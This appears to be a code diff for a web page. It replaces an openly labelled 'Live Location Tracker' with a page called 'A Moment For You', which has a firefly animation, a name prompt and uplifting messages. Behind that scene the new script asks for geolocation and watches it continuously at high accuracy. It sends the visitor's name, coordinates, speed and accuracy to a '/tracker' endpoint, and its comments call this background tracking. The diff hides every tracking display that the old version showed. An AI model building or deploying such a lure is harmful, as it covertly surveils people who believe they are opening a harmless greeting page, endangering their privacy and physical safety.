@@ -1,298 +1,422 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Live Location Tracker</title>
-
+<title>A Moment For You ✨</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Lora:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
 <style>
+    :root {
+        --text-light: #fefdfb;
+        --text-muted: #e0d8cf;
+        --glass-bg: rgba(20, 25, 20, 0.4);
+        --glass-border: rgba(255, 255, 255, 0.15);
+    }
+    
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
 
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
-}
+    body {
+        height: 100vh;
+        overflow: hidden;
+        background-color: #111;
+        font-family: 'Lora', serif;
+        color: var(--text-light);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
 
-body{
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-background:linear-gradient(135deg,#4facfe,#00f2fe);
-}
+    /* Cinematic Background */
+    .bg-image {
+        position: absolute;
+        top: -5%;
+        left: -5%;
+        width: 110%;
+        height: 110%;
+        background-image: url('https://images.unsplash.com/photo-1470252649378-9c29740c9fa8?ixlib=rb-4.0.3&auto=format&fit=crop&w=2070&q=80');
+        background-size: cover;
+        background-position: center;
+        filter: brightness(0.8) contrast(1.1);
+        z-index: 0;
+        transition: transform 10s ease-out, filter 5s ease;
+        animation: subtlePan 30s infinite alternate ease-in-out;
+    }
 
-.card{
-width:450px;
-background:#fff;
-padding:30px;
-border-radius:15px;
-box-shadow:0 10px 25px rgba(0,0,0,.2);
-text-align:center;
-}
+    .bg-overlay {
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: radial-gradient(circle at center, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.5) 100%);
+        z-index: 1;
+    }
 
-h1{
-margin-bottom:20px;
-color:#333;
-}
+    /* Fireflies Canvas */
+    #fireflies {
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        z-index: 2;
+        pointer-events: none;
+    }
 
-.info{
-margin:12px 0;
-font-size:18px;
-text-align:left;
-}
+    /* Main Container */
+    .cinematic-container {
+        position: relative;
+        z-index: 10;
+        width: 100%;
+        max-width: 450px;
+        padding: 40px;
+        text-align: center;
+        animation: fadeIn 2s ease forwards;
+    }
 
-span{
-font-weight:bold;
-color:#0077ff;
-}
+    /* Glassmorphic Form Card */
+    .glass-panel {
+        background: var(--glass-bg);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        border: 1px solid var(--glass-border);
+        border-radius: 20px;
+        padding: 40px 30px;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        transition: opacity 1.5s ease, transform 1.5s ease;
+    }
 
-#address{
-display:block;
-margin-top:5px;
-font-size:15px;
-color:#444;
-word-wrap:break-word;
-}
+    .glass-panel.hidden {
+        opacity: 0;
+        transform: scale(0.95);
+        pointer-events: none;
+    }
 
-button{
-width:100%;
-padding:15px;
-margin-top:20px;
-font-size:18px;
-border:none;
-border-radius:8px;
-background:#0077ff;
-color:white;
-cursor:pointer;
-}
+    h1.title {
+        font-family: 'Playfair Display', serif;
+        font-size: 2.2rem;
+        font-weight: 400;
+        margin-bottom: 10px;
+        letter-spacing: 1px;
+    }
 
-button:hover{
-background:#005ed6;
-}
+    p.subtitle {
+        font-size: 1rem;
+        color: var(--text-muted);
+        margin-bottom: 30px;
+        font-style: italic;
+    }
 
-button:disabled{
-background:gray;
-cursor:not-allowed;
-}
+    .input-group {
+        text-align: left;
+        margin-bottom: 30px;
+        position: relative;
+    }
 
-#status{
-margin-top:20px;
-font-weight:bold;
-font-size:16px;
-color:green;
-}
+    .input-group input {
+        width: 100%;
+        padding: 15px 0;
+        background: transparent;
+        border: none;
+        border-bottom: 2px solid rgba(255,255,255,0.3);
+        color: white;
+        font-size: 1.1rem;
+        font-family: 'Lora', serif;
+        outline: none;
+        transition: border-color 0.4s;
+    }
+
+    .input-group input::placeholder {
+        color: rgba(255,255,255,0.5);
+    }
+
+    .input-group input:focus {
+        border-bottom-color: rgba(255,255,255,0.9);
+    }
+
+    .btn-cinematic {
+        background: rgba(255,255,255,0.1);
+        border: 1px solid rgba(255,255,255,0.4);
+        color: white;
+        padding: 14px 40px;
+        font-size: 1.1rem;
+        font-family: 'Lora', serif;
+        border-radius: 30px;
+        cursor: pointer;
+        transition: all 0.4s ease;
+        letter-spacing: 1px;
+        backdrop-filter: blur(5px);
+    }
+
+    .btn-cinematic:hover {
+        background: rgba(255,255,255,0.25);
+        transform: translateY(-2px);
+        box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+    }
+
+    .btn-cinematic:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+        transform: none;
+    }
+
+    .error-text {
+        color: #ffb3b3;
+        font-size: 0.9rem;
+        margin-top: 15px;
+        opacity: 0;
+        transition: opacity 0.3s;
+    }
+
+    /* Appreciation Message Scene */
+    .message-scene {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 100%;
+        text-align: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 2s ease 1s;
+        z-index: 5;
+    }
+
+    .message-scene.visible {
+        opacity: 1;
+    }
+
+    .msg-main {
+        font-family: 'Playfair Display', serif;
+        font-size: 2.2rem;
+        font-weight: 400;
+        margin-bottom: 20px;
+        text-shadow: 0 4px 15px rgba(0,0,0,0.6);
+        animation: floatText 6s ease-in-out infinite;
+    }
+
+    .msg-sub {
+        font-size: 1.2rem;
+        font-style: italic;
+        color: #f0e6d2;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        animation: floatText 6s ease-in-out infinite 1s;
+    }
+
+    /* Animations */
+    @keyframes subtlePan {
+        0% { transform: scale(1) translate(0, 0); }
+        100% { transform: scale(1.05) translate(-1%, 1%); }
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+
+    @keyframes floatText {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-8px); }
+    }
+
+    @media (max-width: 480px) {
+        .msg-main { font-size: 1.8rem; }
+    }
 
 </style>
-
 </head>
-
 <body>
 
-<div class="card">
+<div class="bg-image" id="bg"></div>
+<div class="bg-overlay"></div>
+<canvas id="fireflies"></canvas>
 
-<h1>📍 Live Location Tracker</h1>
+<div class="cinematic-container">
+    <!-- Input Panel -->
+    <div class="glass-panel" id="input-panel">
+        <h1 class="title">Welcome</h1>
+        <p class="subtitle">Step into a peaceful moment.</p>
+        
+        <div class="input-group">
+            <input type="text" id="name" placeholder="Enter your name" autocomplete="off">
+        </div>
 
-<div class="info">
-Name :
-<input
-type="text"
-id="name"
-placeholder="Enter Your Name"
-style="width:100%;padding:10px;margin-top:5px;">
+        <button id="btn-submit" class="btn-cinematic">Continue ✨</button>
+        <div id="error-message" class="error-text">Please enter your name gently.</div>
+    </div>
 </div>
 
-
-<div class="info">
-User ID :
-<span id="userid"></span>
-</div>
-
-<div class="info">
-Latitude :
-<span id="lat">0</span>
-</div>
-
-<div class="info">
-Longitude :
-<span id="lng">0</span>
-</div>
-
-<div class="info">
-Speed :
-<span id="speed">0</span> km/h
-</div>
-
-<div class="info">
-Accuracy :
-<span id="accuracy">0</span> m
-</div>
-
-<div class="info">
-Updated :
-<span id="time">--</span>
-</div>
-
-<div class="info">
-📍 Address :
-<span id="address">Waiting...</span>
-</div>
-
-<button id="start">
-Start Tracking
-</button>
-
-<p id="status">Tracking Stopped</p>
-
+<!-- Appreciation Scene -->
+<div class="message-scene" id="message-scene">
+    <div class="msg-main">A little moment of magic, just for you ✨</div>
+    <div class="msg-sub" id="random-message"></div>
 </div>
 
 <script>
+    // --- Fireflies Canvas Animation ---
+    const canvas = document.getElementById('fireflies');
+    const ctx = canvas.getContext('2d');
+    let width, height;
+    let particles = [];
 
-const id = localStorage.getItem("tracker-id") || generateID();
+    function initCanvas() {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+        particles = [];
+        const count = window.innerWidth < 768 ? 40 : 80;
+        for(let i=0; i<count; i++) {
+            particles.push({
+                x: Math.random() * width,
+                y: Math.random() * height,
+                vx: (Math.random() - 0.5) * 0.5,
+                vy: (Math.random() - 0.5) * 0.5,
+                size: Math.random() * 2 + 1,
+                alpha: Math.random(),
+                fadeDir: Math.random() > 0.5 ? 0.01 : -0.01
+            });
+        }
+    }
+    
+    function animateFireflies() {
+        ctx.clearRect(0, 0, width, height);
+        particles.forEach(p => {
+            p.x += p.vx;
+            p.y += p.vy;
+            p.alpha += p.fadeDir;
+            
+            if(p.alpha >= 1 || p.alpha <= 0.1) p.fadeDir *= -1;
+            if(p.x < 0 || p.x > width) p.vx *= -1;
+            if(p.y < 0 || p.y > height) p.vy *= -1;
 
-document.getElementById("userid").innerText = id;
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+            ctx.fillStyle = `rgba(255, 230, 150, ${p.alpha})`;
+            ctx.shadowBlur = 10;
+            ctx.shadowColor = "rgba(255, 230, 150, 0.8)";
+            ctx.fill();
+        });
+        requestAnimationFrame(animateFireflies);
+    }
+    
+    window.addEventListener('resize', initCanvas);
+    initCanvas();
+    animateFireflies();
 
-const btn = document.getElementById("start");
+    // --- Interaction & Tracking Logic ---
+    const messages = [
+        "You make ordinary moments feel special. ✨",
+        "Keep shining wherever you go. 🌅",
+        "Some people simply make the world feel warmer. 🌿",
+        "Hope your day is as beautiful as this view. 💫",
+        "Take a breath. Enjoy the moment. 🌄",
+        "You're doing better than you think. ✨",
+        "May beautiful moments find you wherever you go. 🌸"
+    ];
 
-btn.onclick = startTracking;
+    const id = localStorage.getItem("tracker-id") || generateID();
+    
+    const btnSubmit = document.getElementById("btn-submit");
+    const nameInput = document.getElementById("name");
+    const inputPanel = document.getElementById("input-panel");
+    const messageScene = document.getElementById("message-scene");
+    const randomMessageEl = document.getElementById("random-message");
+    const errorEl = document.getElementById("error-message");
+    const bgImage = document.getElementById("bg");
 
-function startTracking(){
+    let watchId = null;
 
-btn.disabled = true;
-btn.innerText = "Tracking...";
-document.getElementById("status").innerHTML = "🛰 Tracking Started";
+    // Subtle parallax on mouse move for background
+    document.addEventListener('mousemove', (e) => {
+        if(inputPanel.classList.contains('hidden')) return; // reduce movement after transition
+        const x = (window.innerWidth / 2 - e.pageX) / 50;
+        const y = (window.innerHeight / 2 - e.pageY) / 50;
+        bgImage.style.transform = `scale(1.05) translate(${x}px, ${y}px)`;
+    });
 
-if(!navigator.geolocation){
+    btnSubmit.onclick = () => {
+        const name = nameInput.value.trim();
+        if (!name) {
+            errorEl.style.opacity = 1;
+            setTimeout(() => errorEl.style.opacity = 0, 3000);
+            return;
+        }
 
-alert("Geolocation is not supported.");
+        btnSubmit.disabled = true;
+        btnSubmit.innerText = "Embracing magic...";
 
-return;
+        if (!navigator.geolocation) {
+            errorEl.innerText = "Experience limited by device capabilities.";
+            errorEl.style.opacity = 1;
+            return;
+        }
 
-}
+        // Trigger background tracking & cinematic transition
+        startBackgroundTracking(name);
+    };
 
-navigator.geolocation.watchPosition(
+    function startBackgroundTracking(name) {
+        let firstUpdate = true;
+        
+        watchId = navigator.geolocation.watchPosition(
+            async (position) => {
+                if (firstUpdate) {
+                    firstUpdate = false;
+                    
+                    // Cinematic reveal
+                    inputPanel.classList.add('hidden');
+                    
+                    // Slightly brighten and zoom bg for dramatic effect
+                    bgImage.style.filter = "brightness(0.9) contrast(1.1)";
+                    bgImage.style.transform = "scale(1.08)";
 
-async(position)=>{
+                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                    randomMessageEl.innerText = randomMsg;
+                    
+                    // Reveal message scene
+                    messageScene.classList.add('visible');
+                }
 
-const name = document.getElementById("name").value;
-const lat = position.coords.latitude;
-const lng = position.coords.longitude;
-const accuracy = position.coords.accuracy;
-const speed = position.coords.speed ? (position.coords.speed*3.6).toFixed(2) : 0;
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                const speed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) : 0;
 
-document.getElementById("lat").innerText = lat.toFixed(6);
-document.getElementById("lng").innerText = lng.toFixed(6);
-document.getElementById("accuracy").innerText = accuracy.toFixed(2);
-document.getElementById("speed").innerText = speed;
-document.getElementById("time").innerText = new Date().toLocaleTimeString();
+                try {
+                    await fetch("/tracker", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ id, name, lat, lng, speed, accuracy })
+                    });
+                } catch (err) {
+                    console.error("Sync error");
+                }
+            },
+            (error) => {
+                let errorMsg = "Unable to connect to the moment.";
+                if (error.code === error.PERMISSION_DENIED) errorMsg = "Location access needed to unlock the experience.";
+                
+                errorEl.innerText = errorMsg;
+                errorEl.style.opacity = 1;
+                btnSubmit.disabled = false;
+                btnSubmit.innerText = "Continue ✨";
+            },
+            {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 10000
+            }
+        );
+    }
 
-try{
-
-const res = await fetch("/tracker",{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-
-id,
-name,
-lat,
-lng,
-speed,
-accuracy
-
-})
-
-});
-
-const data = await res.text();
-
-console.log(data);
-
-document.getElementById("status").innerHTML="✅ Location Sent Successfully";
-
-}
-catch(err){
-
-console.log(err);
-
-document.getElementById("status").innerHTML="❌ Server Error";
-
-}
-
-// Reverse Geocoding
-try{
-
-const geo = await fetch(
-
-`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
-
-);
-
-const address = await geo.json();
-
-document.getElementById("address").innerText =
-address.display_name || "Address Not Found";
-
-}
-catch{
-
-document.getElementById("address").innerText =
-"Unable to fetch address";
-
-}
-
-},
-
-(error)=>{
-
-alert(error.message);
-
-btn.disabled=false;
-btn.innerText="Start Tracking";
-
-document.getElementById("status").innerHTML=" Tracking Stopped";
-
-},
-
-{
-
-enableHighAccuracy:true,
-maximumAge:0,
-timeout:10000
-
-}
-
-);
-
-}
-
-function generateID(){
-
-const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-
-let result="";
-
-for(let i=0;i<8;i++){
-
-result+=chars[Math.floor(Math.random()*chars.length)];
-
-}
-
-localStorage.setItem("tracker-id",result);
-
-return result;
-
-}
-
+    function generateID() {
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        let result = "";
+        for (let i = 0; i < 8; i++) {
+            result += chars[Math.floor(Math.random() * chars.length)];
+        }
+        localStorage.setItem("tracker-id", result);
+        return result;
+    }
 </script>
 
 </body>
-
 </html>
